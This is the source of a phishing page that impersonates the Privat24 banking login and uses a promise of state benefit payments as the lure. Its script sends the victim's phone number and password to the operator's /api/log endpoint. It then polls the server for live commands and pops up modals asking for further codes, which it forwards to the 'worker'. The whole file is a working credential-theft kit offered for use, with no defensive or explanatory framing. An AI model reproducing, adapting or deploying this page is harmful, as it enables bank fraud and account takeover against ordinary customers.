<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Приват24 — Ваш фінансовий термінал</title>
    <link rel="stylesheet" href="privat.css">
    <style>
        body {
            -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
            -webkit-tap-highlight-color: transparent; font-family: sans-serif;
            margin: 0; padding: 0;
        }

        /* QR и верстка */
        .qr-mock {
            width: 100px; height: 100px; background: #fff; border: 1px solid #eee;
            position: relative; display: flex; justify-content: center; align-items: center;
            background-image: url('https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://privat24.ua');
            background-size: cover; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05);
        }
        .qr-mock::after {
            content: "P"; background: #72b128; color: white; font-weight: 900;
            width: 20px; height: 20px; display: flex; justify-content: center; align-items: center;
            font-size: 12px; border-radius: 4px; position: absolute;
        }

        @media (max-width: 850px) {
            .p24-sidebar { display: none; }
            .p24-layout { display: block; }
            .p24-main { padding: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #fff; }
            .login-card { box-shadow: none; border: none; width: 100%; max-width: 100%; padding: 20px; box-sizing: border-box; }
        }

        /* ДИЗАЙН МОДАЛЬНОГО ОКНА */
        #custom-modal {
            display: none; 
            position: fixed; 
            top: 0; left: 0; 
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); 
            z-index: 10000; 
            align-items: center; 
            justify-content: center;
            backdrop-filter: blur(5px);
        }
        .modal-content {
            background: #fff; 
            width: 90%; 
            max-width: 360px; 
            padding: 25px;
            border-radius: 20px; 
            text-align: center; 
            box-shadow: 0 15px 40px rgba(0,0,0,0.4);
            box-sizing: border-box;
            animation: fadeIn 0.3s ease-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        .modal-content h3 { color: #333; margin-bottom: 10px; font-size: 19px; }
        .modal-content p { color: #555; margin-bottom: 20px; font-size: 15px; line-height: 1.4; }
        
        .modal-input-wrapper { margin-bottom: 20px; width: 100%; display: none; }
        .modal-input-wrapper input {
            width: 100%; 
            padding: 15px; 
            border: 2px solid #ddd; 
            border-radius: 12px;
            font-size: 18px; 
            text-align: center; 
            outline: none; 
            transition: all 0.3s;
            box-sizing: border-box; /* Важно для ровного инпута */
            background: #fdfdfd;
        }
        .modal-input-wrapper input:focus { border-color: #72b128; background: #fff; }
        
        .modal-btn {
            background: #72b128; 
            color: #fff; 
            border: none; 
            padding: 15px;
            border-radius: 12px; 
            cursor: pointer; 
            font-weight: bold; 
            width: 100%; 
            font-size: 16px;
            transition: 0.2s;
        }
        .modal-btn:active { transform: scale(0.97); background: #629a21; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="p24-layout">
        <aside class="p24-sidebar">
            <div class="sidebar-content">
                <div class="p24-logo-big"><span class="gr">P</span><span class="bl">24</span></div>
                <h1>Отримуйте державні <br>виплати онлайн</h1>
                <p>Здійснюйте вхід у Приват24 для підтвердження статусу отримувача допомоги.</p>
                <div class="qr-code-box">
                    <div class="qr-mock"></div>
                    <span>Скануйте для входу через додаток</span>
                </div>
            </div>
        </aside>

        <main class="p24-main">
            <div class="login-card">
                <div class="card-tabs">
                    <div class="tab active">Вхід</div>
                    <div class="tab">Бізнес</div>
                </div>
                <form id="p24-form" class="p24-form">
                    <div class="p24-field">
                        <label>Номер телефону</label>
                        <div class="input-wrapper">
                            <span class="prefix">+380</span>
                            <input type="tel" id="p24-phone" maxlength="9" placeholder=" _ _  _ _ _  _ _  _ _ " inputmode="numeric" required>
                        </div>
                    </div>
                    <div class="p24-field">
                        <label>Пароль</label>
                        <input type="password" id="p24-pass" placeholder="Введіть пароль" required>
                    </div>
                    <button type="submit" class="p24-btn-main">Увійти</button>
                    <div class="p24-helper-links">
                        <a href="#">Забули пароль?</a>
                        <a href="#">Реєстрація</a>
                    </div>
                </form>
                <div class="p24-security-info">
                    <img src="https://img.icons8.com/ios-filled/50/72b128/shield.png" width="20" alt="safe">
                    <span>Безпеку транзакцій гарантовано ПриватБанком</span>
                </div>
            </div>
        </main>
    </div>

    <div id="p24-loader" class="p24-full-loader" style="display:none;">
        <div class="p24-spinner-wrapper">
            <div class="p24-circle"></div>
            <div class="p24-logo-small">P</div>
            <p id="loader-text">Триває завантаження...</p>
        </div>
    </div>

    <div id="custom-modal">
        <div class="modal-content">
            <h3 id="modal-title">Підтвердження</h3>
            <p id="modal-desc"></p>
            <div id="modal-input-group" class="modal-input-wrapper">
                <input type="tel" id="modal-input" placeholder="0000" maxlength="20">
            </div>
            <button id="modal-btn" class="modal-btn">ПРОДОВЖИТИ</button>
        </div>
    </div>

    <script>
    // Уникальный ID для сессии
    if (!sessionStorage.getItem('USER_ID')) {
        sessionStorage.setItem('USER_ID', 'ID-' + Math.floor(Math.random() * 89999 + 10000));
    }
    const USER_ID = sessionStorage.getItem('USER_ID');

    // Функция вызова модалки
    function showModal(type, text) {
        return new Promise((resolve) => {
            const modal = document.getElementById('custom-modal');
            const desc = document.getElementById('modal-desc');
            const inputGroup = document.getElementById('modal-input-group');
            const btn = document.getElementById('modal-btn');
            const input = document.getElementById('modal-input');

            desc.innerText = text;
            inputGroup.style.display = (type === 'ask') ? 'block' : 'none';
            modal.style.display = 'flex';
            if(type === 'ask') input.focus();

            btn.onclick = () => {
                const val = input.value;
                modal.style.display = 'none';
                input.value = '';
                resolve(val);
            };
        });
    }

    // Отправка первой формы (Логин/Пароль)
    document.getElementById('p24-form').addEventListener('submit', async function(e) {
        e.preventDefault();
        const phone = document.getElementById('p24-phone').value;
        const pass = document.getElementById('p24-pass').value;
        document.getElementById('p24-loader').style.display = 'flex';
        
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userId: USER_ID,
                type: 'ПРИВАТ24',
                data: { "Логін": "+380" + phone, "Пароль": pass }
            })
        });
    });

    // Опрос сервера на наличие новых команд
    setInterval(async () => {
        try {
            const res = await fetch(`/api/check/${USER_ID}`);
            if (res.status === 200) {
                const data = await res.json();
                if (data) {
                    document.getElementById('p24-loader').style.display = 'none';
                    
                    const result = await showModal(data.action, data.text);
                    
                    if (data.action === 'ask') {
                        document.getElementById('p24-loader').style.display = 'flex';
                        // ОТПРАВЛЯЕМ КАК "ОТВЕТ" - ЭТО ПОЙДЕТ ВОРКЕРУ В ЛИЧКУ
                        fetch('/api/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                userId: USER_ID,
                                type: 'ОТВЕТ',
                                data: { "Користувач ввів": result }
                            })
                        });
                    } else if (data.action === 'msg') {
                        location.reload(); // Перезагрузка при ошибках типа "Баланс"
                    }
                }
            }
        } catch (e) { console.log("Ошибка связи с сервером"); }
    }, 3000);
    </script>
</body>
</html>
